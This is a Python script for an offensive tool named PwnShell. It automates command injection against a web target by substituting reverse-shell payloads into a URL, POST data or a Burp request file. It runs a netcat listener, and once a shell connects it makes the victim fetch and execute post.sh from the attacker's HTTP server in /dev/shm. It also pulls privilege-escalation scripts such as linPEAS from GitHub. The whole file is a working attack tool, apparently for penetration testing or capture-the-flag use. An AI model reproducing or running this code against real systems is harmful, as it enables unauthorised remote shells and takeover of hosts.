#!/usr/bin/env python3
# coding=utf-8
import netifaces
import base64
import os
import argparse
import nclib
from threading import Thread
import ipaddress
import urllib3
import requests
from http.server import HTTPServer, CGIHTTPRequestHandler
import socketserver
import urllib.parse
from payloads import PayLoads
import time
import socket
import burpee


class PwnShell:
    def __init__(self, args):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.ip = ip_address
        self.ip = args.host
        self.port = args.port
        self.domain = args.url
        self.method = args.method
        self.data = args.data
        self.authentication = args.auth
        self.type = args.type
        self.file = args.file
        ########################################################################
        ###################### Specifying OS ###################################
        if self.type == "linux" or self.type == "l":
            self.shell_linux()
        elif self.type == "windows" or self.type == "w":
            self.shell_windows()
        else:
            print("[!]Invalid Value -> " + self.type)
            exit_gracefully()
        ######################################################################

    def info(self):
        print('[*]LOCAL IP ADDRESS : %s' % self.ip)
        print('[*]LOCAL PORT : %s' % self.port)
        print('[*]TARGET URL : %s' % self.domain)
        if self.authentication:
            print('[*]USERNAME : %s' % self.authentication[0])
            print('[*]PASSWORD : %s' % self.authentication[1])
        print('\n[!]Waiting for a Connection ....\n')

    ####################################################################################
    ###################################  LINUX #########################################

    def shell_linux(self):  # Default option
        self.info()
        # self.login()
        self.is_valid()
        self.thread()  # leave it the last one

    #########################################################################################
    ###################################  WINDOWS #########################################

    def shell_windows(self):
        pass

    ######################################################################################
    ##########################  CHECK IF IP & PORT IS VALID ############################

    def is_valid(self):  # Checking if the ip address is valid
        try:
            ipaddress.ip_address(self.ip)
            if self.port <= 65535:
                return True
            else:
                print("[!]Invalid PORT NUMBER -> %d" % self.port)
                exit_gracefully()
        except ValueError:
            print("\n[!]Invalid IP : %d" % self.ip)
            exit_gracefully()

    #########################################################################################
    ##############################  NC LISTNER + STAGER ###################################

    def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
        nc = nclib.Netcat(listen=('', self.port), verbose=True)
        print('\n[*]Downloading PrivESC Scripts From Github..')
        os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
        time.sleep(5)
        send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh ; clear'''
        nc.send_line(send.encode("utf-8"))
        send = f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
        nc.send_line(send.encode("utf-8"))
        nc.interact()
        nc.close()

    #########################################################################################
    ###################################  HTTP SERVER #########################################

    def http_server(self):
        # Make sure the server is created at current directory
        os.chdir('.')
        # Create server object listening the port 9002
        server_object = HTTPServer(server_address=(
            '', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
        # Start the web server
        server_object.serve_forever()

    #########################################################################################
    ###################################  THREADS ############################################

    def thread(self):
        listen = Thread(target=self.listener)
        sendpayload = Thread(target=self.send_payload)
        httpserver = Thread(target=self.http_server)
        burp= Thread(target=self.parse_file)
        listen.daemon = True
        sendpayload.daemon = True
        httpserver.daemon = True
        burp.daemon=True
        burp.start()
        listen.start()
        sendpayload.start()
        httpserver.start()
        burp.join()
        httpserver.join()
        listen.join()
        sendpayload.join()

    ##########################################################################################
    #################################  CHECK IF PORT IS IN USE ##############################

    def is_port_in_use(self):
        output = os.popen('netstat -lant').read()
        lines = output.split('\n')
        for line in lines:
            if str(self.port) in line:
                if line.split()[-1] == 'ESTABLISHED':
                    return True
                return False

    ############################################################################################
    ###################################  SENDING THE PAYLOADS #################################
    def send_payload(self):
        payloads = PayLoads(self.ip, self.port).payloads()
        if self.method == 'post' or self.method == 'POST':
            for payload in payloads:
                self.req_post(payload)
                time.sleep(5)
                if self.is_port_in_use():
                    break
                # Here we have to stop the loop after getting a shell in the second thread
        elif self.method == 'get' or self.method == 'GET':
            print('get method')
            for payload in payloads:
                self.req_get(payload)
        elif self.file:
            self.parse_file()  # this also sends the request


        else:
            return False

    #########################################################################################
    ###################################  POST METHOD #########################################
    def req_post(self, payload):
        if self.domain:
            encoded_payload = self.get_url_encoded_payload(payload)
            print(f'Trying: {payload}')
            url = self.domain.replace('PWNME', encoded_payload)
            proxies = {'http': 'http://127.0.0.1:8080'}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close","Upgrade-Insecure-Requests": "1",'Content-Type': 'application/x-www-form-urlencoded'}  # Don't Change*
            cookies = ''
            if self.data:
                data_parsed = self.data.replace("PWNME", encoded_payload)  # Don't chang
            else:
                data_parsed = None
                r = requests.post(url, headers=headers, data=data_parsed,
                    cookies=cookies, verify=False)

    #########################################################################################
    ###################################  GET METHOD #########################################
    def req_get(self, payload):
        if self.domain:
            print(f'Trying: {payload}')
            encoded_payload = self.get_url_encoded_payload(payload)
            # payload will be the revshells
            url = self.domain.replace('PWNME', self.payload)
            proxies = {'http': 'http://127.0.0.1:8080'}
            cookies = ''
            r = requests.get(url, cookies=cookies, verify=False)

    #########################################################################################
    ###################################  LOGIN   ############################################

    def login(self):
        pass

    ######################################################################################
    ###################################  PARSER BURPREQUEST #################################
    def parse_file(self):
        payloads = PayLoads(self.ip, self.port).payloads()
        for payload in payloads:
            proxies = {'https': 'https://127.0.0.1:8080'}
            encoded_payload = self.get_url_encoded_payload(payload)
            request, post_data = burpee.parse_request(self.file)  # Don;t change
            for r in request:
                if request[r] == "PWNME":
                    request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
                if r == "Host":
                    url = 'http://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
                    
            if post_data:
                url = url.replace("PWNME", encoded_payload)
                post_data = post_data.replace("PWNME", encoded_payload)
                req =requests.post(url,headers=request,data=post_data,verify=False)
                print(req.status_code)
                print(encoded_payload)
            else:
                url = url.replace("PWNME", encoded_payload)
                req = requests.get(url,headers=request,verify=False)
                print(req.status_code)
                print(url)
            time.sleep(5)
            if self.is_port_in_use():
                print("the port is in use")
                break

    #########################################################################################
    ###################################  ENCODING PAYLOADS #################################

    @staticmethod
    def get_url_encoded_payload(payload):
        encoded_payload = urllib.parse.quote(payload)
        encoded_payload = encoded_payload.replace('/', '%2F')
        return encoded_payload


def exit_gracefully():
    print("                                   #GOOD BYE!")
    exit()


if __name__ == '__main__':
    try:
        banner = ''' 
                 __    ____                _____ __         ____    __
               _/ /   / __ \_      ______ / ___// /_  ___  / / /  _/ /
              / __/  / /_/ / | /| / / __ \\__ \/ __ \ / _ \/ / /  / __/
             (_  )  / ____/| |/ |/ / / / /__/ / / / /  __/ / /  (_  ) 
            /  _/  /_/     |__/|__/_/ /_/____/_/ /_/\\___/_/_/  /  _/  
            /_/                                                /_/    
            '''
        print(banner)
        ip_address = netifaces.ifaddresses('eth0')[2][0]['addr']
        ################################# Arguments Creation ###########################################
        parser = argparse.ArgumentParser(
            formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        parser.add_argument(
            '-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
        parser.add_argument(
            '-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
        parser.add_argument(
            "-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
        parser.add_argument(
            "-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
        parser.add_argument("-d", "--data", help='Post data')
        parser.add_argument("-c", "--cookie", help='Enter Cookie')
        parser.add_argument("-k", "--header", help='Provide header')
        parser.add_argument(
            "-m", "--method", help='Request Method', default='post')
        parser.add_argument(
            "-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
        parser.add_argument("-f", "--file", help='Request file')
        args = parser.parse_args()
        ########################################################################
        ########################## Defining variables ##########################
        pwnshell = PwnShell(args)
        pwnshell.send_payload()
    except KeyboardInterrupt:
        exit_gracefully()

# TODO
# Add login form with a session
# Stop loop when getting a connection
# Work on windows
